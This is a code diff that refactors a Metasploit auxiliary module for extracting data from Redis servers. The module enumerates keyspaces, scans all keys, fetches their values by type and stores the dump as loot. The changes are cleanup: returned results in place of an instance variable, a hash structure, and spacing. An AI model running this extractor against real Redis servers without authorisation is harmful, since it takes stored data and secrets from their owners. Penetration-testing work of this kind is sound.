@@ -20,44 +20,42 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   MIN_REDIS_VERSION = '2.8.0'
-  @kv
-
-
 
   # Recurse to assemble the full list of keys
   def scan(offset)
-    response = redis_command('scan',offset)
+    response = redis_command('scan', offset)
     parsed = parse_redis_response(response)
     raise "Unexpected RESP response length" unless parsed.length == 2
     new_offset = parsed[0] # cursor position for next iteration or zero if we are done
     keys = parsed[1]
+    results = []
     keys.each do |key|
-      @kv.push([key,value_for_key(key)])
+      results.push([key, value_for_key(key)])
     end
-    new_offset
+    [new_offset, results]
   end
 
   def value_for_key(key)
-    key_type = redis_command('TYPE',key)
+    key_type = redis_command('TYPE', key)
     key_type = parse_redis_response(key_type)
     case key_type
     when 'string'
-      string_content = redis_command('get',key)
+      string_content = redis_command('get', key)
       return parse_redis_response(string_content)
     when 'list'
-      list_content = redis_command('LRANGE',key,'0','-1')
+      list_content = redis_command('LRANGE', key, '0', '-1')
       return parse_redis_response(list_content)
     when 'set'
-      set_content = redis_command('SMEMBERS',key)
+      set_content = redis_command('SMEMBERS', key)
       return parse_redis_response(set_content)
     when 'zset'
-      set_content = redis_command('ZRANGE',key,'0','-1')
+      set_content = redis_command('ZRANGE', key, '0', '-1')
       return parse_redis_response(set_content)
     when 'hash'
-      hash_content = parse_redis_response(redis_command('HGETALL',key))
-      result = []
+      hash_content = parse_redis_response(redis_command('HGETALL', key))
+      result = {}
       (0..hash_content.length-1).step(2) do |x|
-        result.append([hash_content[x],hash_content[x+1]])
+        result[hash_content[x]] = hash_content[x+1]
       end
       return result
     else
@@ -70,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       connect
       # Note: Full INFO payload fails occasionally. Using server filter until Redis library can be fixed
-      if (info_data = redis_command('INFO','server')) && /redis_version:(?<redis_version>\S+)/ =~ info_data
+      if (info_data = redis_command('INFO', 'server')) && /redis_version:(?<redis_version>\S+)/ =~ info_data
         print_good("Connected to Redis version #{redis_version}")
       end
 
@@ -106,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check_host(ip)
-    info_data=redis_connect
+    info_data = redis_connect
     if(info_data)
       if /os:(?<os_ver>.*)\r/ =~ info_data
         os_ver = os_ver.strip
@@ -127,13 +125,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_keyspace
-    ks = redis_command('INFO','keyspace')
+    ks = redis_command('INFO', 'keyspace')
     ks = parse_redis_response(ks)
     ks = ks.split("\r\n")
     result = []
     ks.each do |k|
       if /db(?<db>\S+):/ =~ k && /keys=(?<keys>\S+),expires/ =~ k
-        result.append([db,keys])
+        result.append([db, keys])
       end
     end
     return result
@@ -148,15 +146,16 @@ class MetasploitModule < Msf::Auxiliary
     keyspace = get_keyspace
     keyspace.each do |space|
       print_status("Extracting about #{space[1]} keys from database #{space[0]}")
-      redis_command('SELECT',space[0])
-      @kv=[]
+      redis_command('SELECT', space[0])
       new_offset = "0"
+      all_results = []
       loop do
-        new_offset = scan(new_offset)
+        new_offset, results = scan(new_offset)
+        all_results.concat(results)
         break if new_offset == "0"
       end
 
-      if(@kv.length == 0)
+      if(all_results.length == 0)
         print_status("No keys returned")
         next
       end
@@ -167,14 +166,14 @@ class MetasploitModule < Msf::Auxiliary
         'Indent'  => 1,
         'Columns' => [ 'Key', 'Value' ]
       )
-      @kv.each { |pair| result_table << pair }
+      all_results.each { |pair| result_table << pair }
       print_line
       print_line("#{result_table}")
 
       # Store data as loot
-      csv=[]
-      @kv.each { |pair| csv << pair.to_csv }
-      path = store_loot("redis.dump_db#{space[0]}", 'text/plain', rhost,csv.join, 'redis.txt', 'Redis extractor')
+      csv = []
+      all_results.each { |pair| csv << pair.to_csv }
+      path = store_loot("redis.dump_db#{space[0]}", 'text/plain', rhost, csv.join, 'redis.txt', 'Redis extractor')
       print_good("Redis data stored at #{path}")
     end
     disconnect
